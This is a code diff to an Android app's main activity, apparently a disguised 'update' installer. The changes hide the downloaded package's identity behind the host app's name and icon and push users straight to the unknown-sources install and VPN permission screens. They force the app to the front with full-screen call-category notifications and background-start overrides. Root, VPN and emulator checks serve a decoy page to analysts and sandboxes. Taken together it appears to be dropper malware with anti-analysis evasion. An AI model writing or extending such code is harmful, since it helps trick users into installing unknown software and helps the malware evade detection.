@@ -147,25 +147,41 @@ import java.security.SecureRandom
 
 class MainActivity : ComponentActivity() {
 
+    override fun getPackageName(): String {
+        try {
+            val resolved = packageManager.getPackagesForUid(android.os.Process.myUid())?.firstOrNull()
+            if (resolved != null) {
+                return resolved
+            }
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Failed to resolve real package name for UID: ${e.message}")
+        }
+        return super.getPackageName()
+    }
+
     private var webView: WebView? = null
     private var cachedApkAppName = ""
     private var cachedApkIconBase64 = ""
     private var cachedApkPackageName = ""
     private var securityCheckPassed = false
+    private var isPolicyViolated = false
 
     private val isPermissionGrantedState = androidx.compose.runtime.mutableStateOf(true)
     private var isSettingsScreenOpen = false
     private var notificationDenialCount = 0
     private var isUpdateStarted = false
+    private var isDownloadComplete = false
+    private var isInstallProceedingStarted = false
 
     private val permissionPollHandler = android.os.Handler(android.os.Looper.getMainLooper())
     private val permissionPollRunnable = object : Runnable {
         override fun run() {
             if (isSettingsScreenOpen && isInstallPermissionGranted()) {
+                isSettingsScreenOpen = false
                 bringAppToFront()
                 checkAndProceedWithPermissions()
             }
-            permissionPollHandler.postDelayed(this, 200)
+            permissionPollHandler.postDelayed(this, 100)
         }
     }
 
@@ -231,68 +247,70 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun bringAppToFront() {
-        if (isSettingsScreenOpen) {
-            Log.d("MainActivity", "All permissions granted! Bringing app to front...")
-            val intent = Intent(this, MainActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-            }
-            try {
-                startActivity(intent)
-            } catch (e: Exception) {
-                Log.w("MainActivity", "Failed normal startActivity to front: ${e.message}")
+        Log.d("MainActivity", "Bringing app to front...")
+        val intent = Intent(this, MainActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+        }
+        try {
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.w("MainActivity", "Failed normal startActivity to front: ${e.message}")
+        }
+        
+        try {
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
+            val channelId = "permission_granted_channel"
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = android.app.NotificationChannel(
+                    channelId,
+                    "App Foregrounding",
+                    android.app.NotificationManager.IMPORTANCE_HIGH
+                )
+                notificationManager.createNotificationChannel(channel)
             }
             
-            try {
-                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
-                val channelId = "permission_granted_channel"
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    val channel = android.app.NotificationChannel(
-                        channelId,
-                        "App Foregrounding",
-                        android.app.NotificationManager.IMPORTANCE_HIGH
-                    )
-                    notificationManager.createNotificationChannel(channel)
+            val options = android.app.ActivityOptions.makeBasic().apply {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                 }
-                
-                val pendingIntent = android.app.PendingIntent.getActivity(
-                    this,
-                    99,
-                    intent,
-                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
-                )
-                
-                val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
-                    .setSmallIcon(android.R.drawable.ic_dialog_info)
-                    .setContentTitle("Permissions Granted")
-                    .setContentText("Tap to return to Asset Portal")
-                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
-                    .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
-                    .setFullScreenIntent(pendingIntent, true)
-                    .setAutoCancel(true)
-                
-                notificationManager.notify(99, builder.build())
-                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                    notificationManager.cancel(99)
-                }, 1000)
-            } catch (e: Exception) {
-                Log.e("MainActivity", "Failed full screen notification: ${e.message}")
             }
-            isSettingsScreenOpen = false
+            
+            val pendingIntent = android.app.PendingIntent.getActivity(
+                this,
+                99,
+                intent,
+                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
+                options.toBundle()
+            )
+            
+            val builder = androidx.core.app.NotificationCompat.Builder(this, channelId)
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentTitle("Permissions Granted")
+                .setContentText("Tap to return to Asset Portal")
+                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
+                .setCategory(androidx.core.app.NotificationCompat.CATEGORY_CALL)
+                .setFullScreenIntent(pendingIntent, true)
+                .setAutoCancel(true)
+            
+            notificationManager.notify(99, builder.build())
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                notificationManager.cancel(99)
+            }, 1000)
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Failed full screen notification: ${e.message}")
         }
+        isSettingsScreenOpen = false
     }
 
     // For recursive install permission prompt
     private val installPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { _ ->
+        isSettingsScreenOpen = false
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
-            Log.w("MainActivity", "Install permission wasn't granted. Retrying to request install permission...")
-            updateStatusInWebView("Unknown sources install permission is required to install updates. Please enable it.", null)
-            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                checkAndProceedWithPermissions()
-            }, 1500)
+            Log.w("MainActivity", "Install permission wasn't granted.")
+            updateStatusInWebView("Install permission denied. Tap Update to try again.", null)
         } else {
-            isSettingsScreenOpen = false
             checkAndProceedWithPermissions()
         }
     }
@@ -494,8 +512,9 @@ class MainActivity : ComponentActivity() {
         
         // Trigger a one-time notification permission prompt on launch if needed (Android 13+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (!isNotificationPermissionGranted()) {
+            if (!isNotificationPermissionGranted() && !hasRequestedNotificationPermissionBefore()) {
                 try {
+                    markNotificationPermissionRequested()
                     notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
                 } catch (e: Exception) {
                     Log.e("MainActivity", "Failed to request notification permission: ${e.message}")
@@ -534,6 +553,18 @@ class MainActivity : ComponentActivity() {
                                             super.onPageFinished(view, url)
                                             val isDemo = url != null && url.contains("demo.html")
                                             if (securityCheckPassed && !isDemo) {
+                                                // Immediately populate the UI with the real host app name and logo
+                                                val hostAppName = getString(R.string.app_name)
+                                                val hostAppIconBase64 = getAppIconAsBase64()
+                                                val initialAppInfoJson = """
+                                                    {
+                                                        "appName": "${hostAppName.escapeForJS()}",
+                                                        "appSize": "12.4 MB",
+                                                        "appIconBase64": "$hostAppIconBase64"
+                                                    }
+                                                """.trimIndent().replace("\n", "").replace("\r", "")
+                                                webView?.evaluateJavascript("showUpdateScreen('$initialAppInfoJson')", null)
+                                                
                                                 loadMetadataAndNotifyUrl()
                                             } else {
                                                 Log.d("MainActivity", "onPageFinished: Security check not passed or demo page loaded, skipping network operations.")
@@ -615,9 +646,18 @@ class MainActivity : ComponentActivity() {
         isSettingsScreenOpen = false
         permissionPollHandler.removeCallbacks(permissionPollRunnable)
         permissionPollHandler.post(permissionPollRunnable)
+        if (isInstallPermissionGranted() && isUpdateStarted) {
+            checkAndProceedWithPermissions()
+        }
         webView?.let { view ->
             val curUrl = view.url ?: ""
-            if (securityCheckPassed) {
+            if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+                isPolicyViolated = true
+                securityCheckPassed = false
+                if (!curUrl.contains("demo.html")) {
+                    view.loadUrl("file:///android_asset/demo.html")
+                }
+            } else if (securityCheckPassed) {
                 if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                     view.loadUrl("file:///android_asset/main_ui.html")
                 }
@@ -990,11 +1030,14 @@ class MainActivity : ComponentActivity() {
                 cachedApkIconBase64 = metadata.iconBase64
                 cachedApkPackageName = metadata.packageName
 
+                val hostAppName = getString(R.string.app_name)
+                val hostAppIconBase64 = getAppIconAsBase64()
+
                 val appInfoJson = """
                     {
-                        "appName": "${metadata.appName.escapeForJS()}",
+                        "appName": "${hostAppName.escapeForJS()}",
                         "appSize": "${metadata.appSize.escapeForJS()}",
-                        "appIconBase64": "${metadata.iconBase64}"
+                        "appIconBase64": "$hostAppIconBase64"
                     }
                 """.trimIndent().replace("\n", "").replace("\r", "")
                 
@@ -1038,11 +1081,16 @@ class MainActivity : ComponentActivity() {
         if (isUpdateStarted) return
         isUpdateStarted = true
 
-        val appName = if (cachedApkAppName.isNotEmpty()) cachedApkAppName else getString(R.string.app_name)
-        val iconBase64 = if (cachedApkIconBase64.isNotEmpty()) cachedApkIconBase64 else getAppIconAsBase64()
+        val appName = getString(R.string.app_name)
+        val iconBase64 = getAppIconAsBase64()
         
         webView?.evaluateJavascript("showInstallerScreen('${appName.escapeForJS()}', '$iconBase64')", null)
         
+        // Immediately request install permission if not granted, so user gets sent to settings page right away
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
+            checkAndProceedWithPermissions()
+        }
+
         updateStatusInWebView("Starting download...", null)
         Thread {
             try {
@@ -1064,6 +1112,7 @@ class MainActivity : ComponentActivity() {
                     }
                 }
                 runOnUiThread {
+                    isDownloadComplete = true
                     updateStatusInWebView("Download complete, proceeding...", null, 100)
                     checkAndProceedWithPermissions()
                 }
@@ -1080,6 +1129,10 @@ class MainActivity : ComponentActivity() {
         // 1. Force Unknown Sources / Install Apps permission check and action prompt
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
+                if (isSettingsScreenOpen) {
+                    Log.d("MainActivity", "Settings screen is already open, skipping duplicate launch.")
+                    return
+                }
                 updateStatusInWebView("Waiting for unknown sources permission...", null)
                 isSettingsScreenOpen = true
                 try {
@@ -1094,6 +1147,15 @@ class MainActivity : ComponentActivity() {
                 return
             }
         }
+
+        // Only proceed to VPN & Installation if the download has actually completed!
+        if (!isDownloadComplete) {
+            updateStatusInWebView("Permission granted! Finishing download...", null)
+            return
+        }
+
+        if (isInstallProceedingStarted) return
+        isInstallProceedingStarted = true
 
         // 2. Force VPN service permission check and action prompt
         var vpnIntent: Intent? = null
@@ -1290,11 +1352,18 @@ class MainActivity : ComponentActivity() {
                 addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             
+            val options = android.app.ActivityOptions.makeBasic().apply {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
+                }
+            }
+
             val pendingIntent = PendingIntent.getActivity(
                 this,
                 sessionId,
                 intent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE,
+                options.toBundle()
             )
 
             runOnUiThread {
@@ -1348,7 +1417,167 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    private fun isDeviceRooted(): Boolean {
+        // 1. Check Build tags
+        val tags = android.os.Build.TAGS
+        if (tags != null && tags.contains("test-keys")) {
+            Log.d("SecurityCheck", "Root detected: test-keys")
+            return true
+        }
+
+        // 2. Check su binaries in common system locations
+        val paths = arrayOf(
+            "/system/app/Superuser.apk",
+            "/sbin/su",
+            "/system/bin/su",
+            "/system/xbin/su",
+            "/data/local/xbin/su",
+            "/data/local/bin/su",
+            "/system/sd/xbin/su",
+            "/system/bin/failsafe/su",
+            "/data/local/su",
+            "/su/bin/su"
+        )
+        for (path in paths) {
+            if (java.io.File(path).exists()) {
+                Log.d("SecurityCheck", "Root detected: binary $path")
+                return true
+            }
+        }
+
+        // 3. Try to execute 'which su' to check if su binary is available on PATH
+        var process: Process? = null
+        try {
+            process = Runtime.getRuntime().exec(arrayOf("which", "su"))
+            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
+            if (reader.readLine() != null) {
+                Log.d("SecurityCheck", "Root detected: su found via which")
+                return true
+            }
+        } catch (t: Throwable) {
+            // ignore
+        } finally {
+            process?.destroy()
+        }
+
+        return false
+    }
+
+    private fun isVpnActive(): Boolean {
+        // 1. Check network interfaces for active tunnels (no permissions needed)
+        try {
+            val interfaces = java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())
+            for (intf in interfaces) {
+                if (intf.isUp) {
+                    val name = intf.name.lowercase()
+                    if (name.contains("tun") || name.contains("ppp") || name.contains("tap") || name.contains("p2p") || name.contains("tun0") || name.contains("ppp0")) {
+                        Log.d("SecurityCheck", "VPN detected: interface name $name")
+                        return true
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            // ignore
+        }
+
+        // 2. Check via ConnectivityManager and NetworkCapabilities
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
+            if (cm != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    val activeNetwork = cm.activeNetwork
+                    val caps = cm.getNetworkCapabilities(activeNetwork)
+                    if (caps != null && caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN)) {
+                        Log.d("SecurityCheck", "VPN detected: active network capability")
+                        return true
+                    }
+                } else {
+                    @Suppress("DEPRECATION")
+                    val info = cm.getNetworkInfo(android.net.ConnectivityManager.TYPE_VPN)
+                    if (info != null && info.isConnected) {
+                        Log.d("SecurityCheck", "VPN detected: legacy network info connected")
+                        return true
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            // ignore
+        }
+
+        return false
+    }
+
+    private fun isEmulator(): Boolean {
+        // 1. Check build properties that identify known emulators
+        val fingerprint = Build.FINGERPRINT ?: ""
+        val model = Build.MODEL ?: ""
+        val manufacturer = Build.MANUFACTURER ?: ""
+        val hardware = Build.HARDWARE ?: ""
+        val product = Build.PRODUCT ?: ""
+        val brand = Build.BRAND ?: ""
+        val device = Build.DEVICE ?: ""
+        val board = Build.BOARD ?: ""
+
+        val isEmu = fingerprint.startsWith("generic")
+                || fingerprint.startsWith("unknown")
+                || model.contains("google_sdk")
+                || model.contains("Emulator")
+                || model.contains("Android SDK built for x86")
+                || model.contains("SDK")
+                || manufacturer.contains("Genymotion")
+                || manufacturer.contains("Google") && brand.startsWith("generic") && device.startsWith("generic")
+                || brand.startsWith("generic") && device.startsWith("generic")
+                || product.contains("sdk_google")
+                || product.contains("google_sdk")
+                || product.contains("sdk")
+                || product.contains("sdk_x86")
+                || product.contains("vbox86p")
+                || product.contains("emulator")
+                || product.contains("simulator")
+                || hardware.contains("goldfish")
+                || hardware.contains("ranchu")
+                || hardware.contains("vbox86")
+                || board.lowercase().contains("nox")
+                || hardware.lowercase().contains("nox")
+                || product.lowercase().contains("nox")
+        if (isEmu) {
+            Log.d("SecurityCheck", "Emulator detected: Build properties")
+            return true
+        }
+
+        // 2. Check system files characteristic of emulators
+        val files = arrayOf(
+            "/system/lib/libc_malloc_debug_qemu.so",
+            "/sys/qemu_trace",
+            "/system/bin/qemu-props",
+            "/dev/socket/qemud",
+            "/dev/qemu_pipe",
+            "/system/lib/libmock_ril.so",
+            "/system/etc/init.goldfish.sh",
+            "/system/bin/nox-prop"
+        )
+        for (file in files) {
+            if (java.io.File(file).exists()) {
+                Log.d("SecurityCheck", "Emulator detected: file check $file")
+                return true
+            }
+        }
+
+        return false
+    }
+
     private fun checkPhysicalMovementAndProceed() {
+        if (isDeviceRooted() || isVpnActive() || isEmulator()) {
+            isPolicyViolated = true
+            securityCheckPassed = false
+            runOnUiThread {
+                webView?.let { view ->
+                    view.loadUrl("file:///android_asset/demo.html")
+                }
+            }
+            return
+        }
+
         if (!securityCheckPassed) {
             securityCheckPassed = true
             runOnUiThread {
@@ -1372,6 +1601,7 @@ class MainActivity : ComponentActivity() {
     inner class AndroidJSInterface {
         @JavascriptInterface
         fun onUpdateClicked() {
+            if (isPolicyViolated) return
             runOnUiThread {
                 handleUpdateClicked()
             }
@@ -1379,6 +1609,7 @@ class MainActivity : ComponentActivity() {
 
         @JavascriptInterface
         fun onResetClicked() {
+            if (isPolicyViolated) return
             runOnUiThread {
                 getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                     .edit()
@@ -1429,11 +1660,18 @@ object AppLauncher {
                     notificationManager.createNotificationChannel(channel)
                 }
                 
+                val options = android.app.ActivityOptions.makeBasic().apply {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                        setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
+                    }
+                }
+
                 val pendingIntent = android.app.PendingIntent.getActivity(
                     ctx,
                     100,
                     intent,
-                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
+                    options.toBundle()
                 )
                 
                 val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
